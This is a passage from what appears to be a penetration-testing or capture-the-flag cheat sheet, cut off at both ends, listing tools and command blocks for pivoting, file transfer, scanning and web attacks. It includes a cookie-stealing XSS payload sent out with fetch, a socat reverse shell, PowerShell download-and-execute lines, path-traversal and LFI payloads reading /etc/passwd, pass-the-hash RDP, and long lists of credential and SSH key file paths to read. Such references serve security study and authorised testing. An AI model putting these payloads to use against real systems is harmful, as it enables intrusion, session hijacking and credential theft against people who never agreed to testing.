| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
| ysoserial | https://github.com/frohoff/ysoserial |
| ysoserial.net | https://github.com/pwntester/ysoserial.net |
### Wordlists

| Name | URL |
| --- | --- |
| bopscrk | https://github.com/R3nt0n/bopscrk |
| CeWL | https://github.com/digininja/cewl |
| COOK | https://github.com/giteshnxtlvl/cook |
| CUPP | https://github.com/Mebus/cupp |
| Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
| SecLists | https://github.com/danielmiessler/SecLists |

### Social Media Resources

| Name | URL |
| --- | --- |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/
| HackTricks | https://book.hacktricks.xyz/ |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |

## Commands

### Basics

#### curl

```c
curl -v http://<RHOST>
curl -k <RHOST>
curl -X POST http://<RHOST>
curl -I POST http://<RHOST>
curl -X PUT http://<RHOST>
curl -vvv <RHOST>
curl --head http://<RHOST>/
curl --proxy http://127.0.0.1:8080
curl -X POST http://<RHOST>/select --data 'db=whatever|id'
curl --path-as-is http://<RHOST>/../../../../../../etc/passwd
curl -s "http://<RHOST>/reports.php?report=2589" | grep Do -A8 | html2text
```

#### Chisel

##### Reverse Pivot

```c
./chisel server -p 9002 -reverse -v
./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888
```

##### SOCKS5 / Proxychains Configuration

```c
./chisel server -p 9002 -reverse -v
./chisel client <RHOST>:9002 R:socks
```

#### File Transfer

##### Certutil

```c
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

##### Netcat

```c
nc -lnvp <LPORT> < <FILE>
nc <RHOST> <RPORT> > <FILE>
```

##### Impacket

```c
sudo python3 impacket/examples/smbserver.py <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support
```

```c
copy * \\<LHOST>\<SHARE>
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing)
```

##### Bash only

###### wget version

Paste directly to the shell.

```c
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

```c
__wget http://<LHOST>/<FILE>
```

###### curl version

```c
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```c
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

#### Kerberos

```c
sudo apt-get install krb5-kdc
```

```c
/etc/krb5.conf                   // kerberos configuration file location
kinit <USERNAME>                 // creating ticket request
klist                            // show available kerberos tickets
kdestroy                         // delete cached kerberos tickets
.k5login                         // resides kerberos principals for login (place in home directory)
krb5.keytab                      // "key table" file for one or more principals
kadmin                           // kerberos administration console
add_principal <EMAIL>            // add a new user to a keytab file
ksu                              // executes a command with kerberos authentication
klist -k /etc/krb5.keytab        // lists keytab file
kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
```

#### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

##### Download Proxy and Agent

```c
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

##### Prepare Tunnel Interface

```c
sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
sudo ip link set ligolo up
```

##### Setup Proxy on Attacker Machine

```c
./proxy -laddr <LHOST>:443 -selfcert
```

##### Setup Agent on Target Machine

```c
./agent -connect <LHOST>:443 -ignore-cert
```

##### Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
sudo ip r add 172.16.1.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

#### Linux

##### CentOS

```c
doas -u <USERNAME> /bin/sh
```

##### Environment Variables

```c
export PATH=`pwd`:$PATH
```

##### gcc

```c
gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

##### getfacl

```c
getfacl <LOCAL_DIRECTORY>
```

##### iconv

```c
echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
```

##### vi

```c
:w !sudo tee %    # save file with elevated privileges without exiting
```

##### Windows Command Formatting

```c
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

#### Microsoft Windows

##### dir

```c
dir flag* /s /p
dir /s /b *.log
```

#### PHP Webserver

```c
sudo php -S 127.0.0.1:80
```

#### Ping

```c
ping -c 1 <RHOST>
ping -n 1 <RHOST>
```

#### Python Webserver

```c
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80
```

#### RDP

```c
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /h:1010 /w:1920
rdesktop <RHOST>
```

#### showmount

```c
/usr/sbin/showmount -e <RHOST>
sudo showmount -e <RHOST>
chown root:root sid-shell; chmod +s sid-shell
```

#### smbclient

```c
smbclient -L \\<RHOST>\ -N
smbclient -L //<RHOST>/ -N
smbclient -L ////<RHOST>/ -N
smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
smbclient "\\\\<RHOST>\<SHARE>"
smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<RHOST>/<SHARE>
mount.cifs //<RHOST>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
```

##### Download multiple files at once

```c
mask""
recurse ON
prompt OFF
mget *
```

#### socat

```c
socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
```

```c
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

```c
socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
```

#### SSH

```c
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1

ssh -R 8080:<LHOST>:80 <RHOST>
ssh -L 8000:127.0.0.1:8000 <USERNAME>@<RHOST>
ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>

ssh -L 80:<LHOST>:80 <RHOST>
ssh -L 127.0.0.1:80:<LHOST>:80 <RHOST>
ssh -L 80:localhost:80 <RHOST>
```

#### Time and Date

##### Get the Server Time

```c
sudo nmap -sU -p 123 --script ntp-info <RHOST>
```

##### Stop virtualbox-guest-utils to stop syncing Time

```c
sudo /etc/init.d/virtualbox-guest-utils stop
```

##### Disable automatic Sync

```c
sudo systemctl disable --now chronyd
```

##### Options to set the Date and Time

```c
sudo net time -c <RHOST>
sudo net time set -S <RHOST>
sudo ntpdate -s <RHOST>
sudo ntpdate -b -u <RHOST>
sudo timedatectl set-timezone UTC
sudo timedatectl list-timezones
sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo timedatectl set-local-rtc 1
```

##### Keep in Sync with a Server

```c
while [ 1 ]; do sudo ntpdate <RHOST>;done
```

#### Tmux

```c
ctrl b + w    # show windows
ctrl + "      # split window horizontal
ctrl + %      # split window vertical
ctrl + ,      # rename window
ctrl + {      # flip window
ctrl + }      # flip window
ctrl + spacebar    # switch pane layout
```

Copy & Paste
```c
:setw -g mode-keys vi
ctrl b + [
space
enter
ctrl b + ]
```

Search
```c
ctrl b + [    # enter copy
ctrl + /      # enter search while within copy mode for vi mode
n             # search next
shift + n     # reverse search
```

Logging
```c
ctrl b
shift + P    # start / stop
```

Save Output
```c
ctrl b + :
capture-pane -S -
ctrl b + :
save-buffer <FILE>.txt
```

#### Upgrading Shells

```c
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

Alternatively:

```c
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

#### VirtualBox

```c
sudo pkill VBoxClient && VBoxClient --clipboard
```

#### virtualenv

```c
sudo apt-get install virtualenv
virtualenv -p python2.7 venv
. venv/bin/activate
```

```c
python.exe -m pip install virtualenv
python.exe -m virtualenv venv
venv\Scripts\activate
```

### Information Gathering

#### memcached

>  https://github.com/pd4d10/memcached-cli

```c
memcrashed / 11211/UDP

npm install -g memcached-cli
memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

STAT pid 21357
STAT uptime 41557034
STAT time 1519734962

sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info

stats items
stats cachedump 1 0
get link
get file
get user
get passwd
get account
get username
get password
```

#### NetBIOS

```c
nbtscan <RHOST>
nmblookup -A <RHOST>
```

#### Nmap

```c
sudo nmap -A -T4 -sC -sV -p- <RHOST>
sudo nmap -sV -sU <RHOST>
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```

#### Port Scanning

```c
for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
```

```c
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

#### snmpwalk

```c
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
```

### Web Application Analysis

#### Burp Suite

```c
Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
```

#### Set Proxy Environment Variables

```c
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=https://localhost:8080
```

#### Cross-Site Scripting (XSS)

```c
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
```

#### ffuf

```c
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

##### API Fuzzing

```c
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

##### Searching for LFI

```c
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

##### Fuzzing with PHP Session ID

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

##### Recursion

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
```

##### File Extensions

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
```

##### Rate Limiting

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
```

##### Virtual Host Discovery

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -fs 1495
```

##### Massive File Extension Discovery

```c
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

#### GitTools

```c
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

#### Gobuster

```c
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

##### Common File Extensions

```c
txt,bak,php,html,js,asp,aspx
```

##### Common Picture Extensions

```c
png,jpg,jpeg,gif,bmp
```

##### POST Requests

```c
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

##### DNS Recon

```c
gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

##### VHost Discovery

```c
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

##### Specifiy User Agent

```c
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

#### Local File Inclusion (LFI)

```c
http://<RHOST>/<FILE>.php?file=
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```
##### Until php 5.3

```c
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

##### Null Byte

```c
%00
0x00
```

##### Encoded Traversal Strings

```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

##### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```c
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```c
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <FILE>.php
```

##### Django, Rails, or Node.js Web Application Header Values

```c
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

##### Linux Files

```c
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

##### Windows Files

```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

#### PDF PHP Inclusion

Create a file with a PDF header, which contains PHP code.

```c
%PDF-1.4

<?php
